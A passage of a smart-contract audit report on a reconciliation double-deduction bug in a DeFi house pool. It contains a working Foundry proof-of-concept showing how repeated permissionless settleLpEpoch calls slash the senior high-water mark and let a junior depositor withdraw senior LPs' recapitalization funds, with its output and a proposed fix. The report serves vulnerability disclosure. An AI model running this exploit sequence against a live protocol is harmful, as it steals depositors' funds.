        uint256 pendingAfter2 = pool.pendingRecapitalizationAssets();
        console2.log("After settle #2 -> seniorPrincipal:", seniorAfter2);
        console2.log("After settle #2 -> seniorHighWaterMark:", hwmAfter2);
        console2.log("After settle #2 -> pendingRecap:", pendingAfter2);

        // BUG PROOF: settle #2 falsely wiped seniorPrincipal to 0 via double-deduction in planReconcile,
        // then applyClaimantRecapitalizationIntent slashed seniorHighWaterMark down to pendingAfter1
        // and burned another chunk of pendingRecapitalizationAssets!
        assertLt(hwmAfter2, hwmAfter1, "BUG: seniorHighWaterMark slashed on 2nd settle");
        assertLt(pendingAfter2, pendingAfter1, "BUG: pendingRecapitalizationAssets burned on 2nd settle");

        // --- Third permissionless settleLpEpoch at the SAME price (burns remaining pendingRecap to 0) ---
        vm.prank(REDEEM_HELPER_3);
        uint256 redeemEpoch3Trigger = juniorVault.requestRedeem(1, REDEEM_HELPER_3, REDEEM_HELPER_3);
        _warpToEpoch(redeemEpoch3Trigger);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());

        vm.prank(attackerCaller);
        router.settleLpEpoch(_emptyUpdateData());

        console2.log("After settle #3 -> seniorPrincipal:", pool.seniorPrincipal());
        console2.log("After settle #3 -> seniorHighWaterMark:", pool.seniorHighWaterMark());
        console2.log("After settle #3 -> pendingRecap:", pool.pendingRecapitalizationAssets());
        assertEq(pool.pendingRecapitalizationAssets(), 0, "pendingRecapitalizationAssets completely burned to 0");
        assertEq(pool.seniorHighWaterMark(), hwmAfter2, "HWM remains permanently slashed below recapAmount");

        // --- Price returns to 1.00 (temporary unrealized trader profit disappears) ---
        // TRADER_LONG closes at breakeven (1.00) or price returns to 1.00.
        vm.warp(vm.getBlockTimestamp() + 10);
        _close(TRADER_LONG, CfdTypes.Side.LONG, 100_000e18, 1e8);

        // Queue a redeem from JUNIOR_ATTACKER to trigger reconcile and withdraw the stolen surplus.
        uint256 attackerRemainingShares = juniorVault.balanceOf(JUNIOR_ATTACKER);
        vm.prank(JUNIOR_ATTACKER);
        uint256 redeemEpoch3 = juniorVault.requestRedeem(
            attackerRemainingShares, JUNIOR_ATTACKER, JUNIOR_ATTACKER
        );
        _warpToEpoch(redeemEpoch3);
        pool.settleLpEpoch(0, 0);

        console2.log("After recovery -> seniorPrincipal:", pool.seniorPrincipal());
        console2.log("After recovery -> seniorHighWaterMark:", pool.seniorHighWaterMark());
        console2.log("After recovery -> juniorPrincipal:", pool.juniorPrincipal());
        console2.log("After recovery -> pendingRecap:", pool.pendingRecapitalizationAssets());

        // Senior was capped at the slashed HWM instead of recovering to 100,000 USDG;
        // the difference leaked to juniorPrincipal and can be withdrawn by JUNIOR_ATTACKER!
        assertLt(pool.seniorPrincipal(), recapAmount, "Senior permanently shortchanged below recapAmount");
        assertGt(pool.juniorPrincipal(), 0, "Stolen recapitalization leaked into juniorPrincipal");

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch3, JUNIOR_ATTACKER);
        assertGt(claimableShares, 0, "JUNIOR_ATTACKER has claimable shares from stolen surplus");
        vm.prank(JUNIOR_ATTACKER);
        uint256 grossWithdrawnAssets = juniorVault.claimRedeem(
            redeemEpoch3, claimableShares, JUNIOR_ATTACKER, JUNIOR_ATTACKER
        );
        uint256 attackerNetProfit = grossWithdrawnAssets > 49_000e6 ? grossWithdrawnAssets - 49_000e6 : 0;
        uint256 seniorShortfall = recapAmount > pool.seniorPrincipal() ? recapAmount - pool.seniorPrincipal() : 0;

        console2.log("JUNIOR_ATTACKER gross withdrawal:", grossWithdrawnAssets);
        console2.log("JUNIOR_ATTACKER net profit over deposit:", attackerNetProfit);
        console2.log("Senior LP recovery shortfall:", seniorShortfall);

        assertEq(grossWithdrawnAssets, 61_939_886634, "gross withdrawal matches 61,939.886634 USDG");
        assertEq(attackerNetProfit, 12_939_886634, "net profit over deposit matches ~12,939.89 USDG");
        assertEq(seniorShortfall, 36_601_400000, "Senior recovery shortfall matches 36,601.40 USDG");

        // Property-based checks: conservation of assets and strict non-monotonicity of pending recap
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal() + grossWithdrawnAssets, cashBeforeRecap + recapAmount, "conservation of assets across senior, junior and withdrawn surplus");
        assertLt(pendingAfter2, pendingAfter1, "pendingRecap strictly decreased on repeat reconcile without fresh inflow");
    }

    function test_Control_WithoutSecondReconcileBeforeRecovery_SeniorRecoversFullTarget() public {
        _makePoolAssetsWithTwoTraders();

        _fundTrader(TRADER_LONG, 130_000e6);
        _fundTrader(TRADER_SHORT, 150_000e6);
        _open(TRADER_LONG, CfdTypes.Side.LONG, 100_000e18, 120_000e6, 1e8);
        _open(TRADER_SHORT, CfdTypes.Side.SHORT, 130_000e18, 140_000e6, 1e8);

        vm.warp(vm.getBlockTimestamp() + 10);
        _close(TRADER_SHORT, CfdTypes.Side.SHORT, 130_000e18, 1.95e8);

        uint256 recapAmount = 100_000e6;
        settlementToken.mint(address(this), recapAmount);
        settlementToken.approve(address(engine), recapAmount);
        engine.recapitalizePool(recapAmount);
        engine.clearDegradedMode();

        vm.warp(vm.getBlockTimestamp() + 10);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdateData());

        // Only ONE settleLpEpoch while price is at 0.10
        vm.prank(REDEEM_HELPER_1);
        uint256 redeemEpoch1 = juniorVault.requestRedeem(1, REDEEM_HELPER_1, REDEEM_HELPER_1);
        _warpToEpoch(redeemEpoch1);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());
        router.settleLpEpoch(_emptyUpdateData());

        assertEq(pool.seniorHighWaterMark(), recapAmount, "Single settle preserves full HWM");

        // Price returns to 1.00 and TRADER_LONG closes
        vm.warp(vm.getBlockTimestamp() + 10);
        _close(TRADER_LONG, CfdTypes.Side.LONG, 100_000e18, 1e8);

        uint256 attackerRemainingShares = juniorVault.balanceOf(JUNIOR_ATTACKER);
        vm.prank(JUNIOR_ATTACKER);
        uint256 redeemEpoch3 = juniorVault.requestRedeem(
            attackerRemainingShares, JUNIOR_ATTACKER, JUNIOR_ATTACKER
        );
        _warpToEpoch(redeemEpoch3);
        pool.settleLpEpoch(0, 0);

        // Without the repeated reconcile bug, Senior recovers >= recapAmount before Junior gets residual
        assertGe(pool.seniorPrincipal(), recapAmount, "Senior recovers full 100,000 USDG target");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "Pending recap fully settled to Senior");

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch3, JUNIOR_ATTACKER);
        assertEq(claimableShares, 0, "Junior receives 0 claimable shares in control flow");
        assertEq(pool.juniorPrincipal(), 0, "Junior principal remains 0 in control flow");
        uint256 controlSeniorShortfall = pool.seniorPrincipal() >= recapAmount ? 0 : recapAmount - pool.seniorPrincipal();
        console2.log("Control -> seniorPrincipal:", pool.seniorPrincipal());
        console2.log("Control -> seniorHighWaterMark:", pool.seniorHighWaterMark());
        console2.log("Control -> juniorPrincipal:", pool.juniorPrincipal());
        console2.log("Control -> unassignedAssets:", pool.unassignedAssets());
        console2.log("Control -> JUNIOR_ATTACKER claimableShares:", claimableShares);
        console2.log("Control -> Senior LP recovery shortfall:", controlSeniorShortfall);
    }

}
EOF
```

#### 4.2.3. Run the Test Suite

```bash
cd packages/perps
forge test --match-contract HousePoolRecapDoubleCountPoCTest -vv
```

### 4.3. Execution Trace Output (Commit `a82d4fef`)

```text
Ran 2 tests for test/perps/spec/lp/HousePoolRecapDoubleCountPoC.t.sol:HousePoolRecapDoubleCountPoCTest
[PASS] test_Control_WithoutSecondReconcileBeforeRecovery_SeniorRecoversFullTarget() (gas: 8553050)
Logs:
  Control -> seniorPrincipal: 100000000000
  Control -> seniorHighWaterMark: 100000000000
  Control -> juniorPrincipal: 0
  Control -> unassignedAssets: 26601400000
  Control -> JUNIOR_ATTACKER claimableShares: 0
  Control -> Senior LP recovery shortfall: 0

[PASS] test_PoC_RecapitalizationDoubleCount_SlashesSeniorHwmAndTransfersValueToJunior() (gas: 11403924)
Logs:
  Pool cash after short payout: 26601400000
  After settle #1 -> seniorPrincipal: 36601400000
  After settle #1 -> seniorHighWaterMark: 100000000000
  After settle #1 -> pendingRecap: 63398600000
  After settle #2 -> seniorPrincipal: 36601400000
  After settle #2 -> seniorHighWaterMark: 63398600000
  After settle #2 -> pendingRecap: 26797200000
  After settle #3 -> seniorPrincipal: 36601400000
  After settle #3 -> seniorHighWaterMark: 63398600000
  After settle #3 -> pendingRecap: 0
  After recovery -> seniorPrincipal: 63398600000
  After recovery -> seniorHighWaterMark: 63398600000
  After recovery -> juniorPrincipal: 1262913366
  After recovery -> pendingRecap: 0
  JUNIOR_ATTACKER gross withdrawal: 61939886634
  JUNIOR_ATTACKER net profit over deposit: 12939886634
  Senior LP recovery shortfall: 36601400000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 15.09ms (14.74ms CPU time)

Ran 1 test suite in 15.91ms (15.09ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

> [!NOTE] Clarification regarding `juniorPrincipal: 1262913366` in console logs:
> The value `1,262.913366 USDG` is logged immediately after the escrow funding of the attacker's redemption request. The entire surplus liquidity above the slashed HWM (`126,601.40 - 63,398.60 = 63,202.80 USDG`) flowed completely into Junior: of that, `61,939.886634 USDG` was transferred by the contract into the attacker's claimable redemption escrow (`claimableShares`), and the remaining `1,262.913366 USDG` stayed in `juniorPrincipal` backing the permanent 1,000 USDG Junior seed shares. The equality is exact: `63,202.80 - 61,939.886634 = 1,262.913366 USDG`.

Both tests definitively isolate the defect: under identical initial states and without repeated `_reconcile`, Senior LP completely recovers `100,000.00 USDG` while `JUNIOR_ATTACKER` (who deposited `49,000.00 USDG`) receives `0 USDG` (`claimableShares == 0`); under repeated permissionless `settleLpEpoch` invocations prior to price reversion, `seniorHighWaterMark` is ratcheted down to `63,398.60 USDG`, `pendingRecapitalizationAssets` is completely burned to `0`, Senior LP loses `36,601.40 USDG` of recovery compared to the control run, and `JUNIOR_ATTACKER` extracts a gross payout of `61,939.886634 USDG` (`~12,939.89 USDG` net profit above deposit).

---

## 5. Remediation

### 5.1. Architectural Cause: Why Simply Removing the Deduction from `planReconcile` is Insufficient

Removing the `pendingBucketAssets` deduction from `snapshot.distributable` in `HousePoolReconcilePlanLib.planReconcile` is unsafe: if `recapitalizePool` (or `Revenue` with `CashArrived`) arrives in the pool **before** the initial `_reconcile` pass while contracts still hold stale (unimpaired) `seniorPrincipal` and `juniorPrincipal` balances, omitting the deduction would cause ordinary reconciliation to credit the fresh recapitalization toward covering trading losses, shielding Junior LP at the expense of owner funds.

### 5.2. Recommended Fix (Separation of Fresh Inflows and Carried Residuals)

The root defect is the conflation within the single `pendingRecapitalizationAssets` (and `pendingTradingRevenueAssets`) counter of:
1. **Fresh inflows (`unreconciled`)**, which have not yet passed through reconciliation (and must be reserved from `distributable` before comparing against prior `claimedEquity` to avoid absorbing third-party losses);
2. **Carried unallocated residuals (`residual`)**, which have already undergone reconciliation but were temporarily unable to fit into `distributable` due to trader claims (`traderClaimBalanceAssets`) or open position deltas (`terminalLpPriceDeltaAssets < 0`). The portion of recapitalization that has already been distributed into `seniorPrincipal` **must not** be subtracted from `distributable` on subsequent epochs.

**Architectural Requirements for Remediation:**
- **Idempotence Regression Invariant:** A repeated call to `_reconcile` under a fixed `distributable` and without fresh external inflows (`CashArrived`) must be a strict `no-op` with respect to the tuple `(pendingRecapitalizationAssets, seniorHighWaterMark, seniorPrincipal, juniorPrincipal)`.
- **Separated Tracking of Inflows vs. Residuals:** Track the portion of pending buckets already capitalized into pool equity (`seniorPrincipal + juniorPrincipal + unassignedAssets`). Subsequent `_reconcile` invocations without fresh capital must not deduct this carried remainder from `distributable` in `planReconcile`.
- **Settling Residuals Exclusively from Free Increments:** Discharge of the carried residual (`residual`) must occur solely from genuine surplus pool value beyond already distributed capital.
- **Resilience Against Inter-Epoch Mark Volatility:** To guard against scenarios where pool value fluctuates between epochs (a localized loss impairs `seniorPrincipal` and a subsequent bounce restores it), residual settlements must be calculated against the historical high-water mark of already recognized capital since recapitalization arrival, ensuring price rebounds do not re-consume recapitalization residuals for already settled entitlements.

### 5.3. Associated Defect: `seniorHighWaterMark` Overwrite in `HousePoolPendingPreviewLib.sol`

Analysis also identified an associated defect in `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:118-122`):
When `seniorPrincipal == 0 && juniorPrincipal == 0`, the contract unconditionally overwrites `seniorHighWaterMark`:
```solidity
state.waterfall.seniorHighWaterMark = recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```

If the pool had accrued Senior LP coupon yield (e.g., `seniorHighWaterMark = 100,002.748874 USDG` across prior epochs), then on a partial recapitalization (`distributable < recapitalizationTargetAssets`), `seniorHighWaterMark` is ratcheted down to the current tranche size, destroying accrued user yield.

**Hardening Recommendation:**
Guard HWM against downward ratcheting by enforcing a maximum condition:
```solidity
uint256 targetHighWaterMark = recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
if (targetHighWaterMark > state.waterfall.seniorHighWaterMark) {
    state.waterfall.seniorHighWaterMark = targetHighWaterMark;
}
```
*(Note: the primary PoC execution operates in a fixture with 0 bps coupon, ensuring exact deterministic round values; the presence of an active 800 bps coupon ratchets HWM on each pass but leaves the core unconditional overwrite defect intact).*


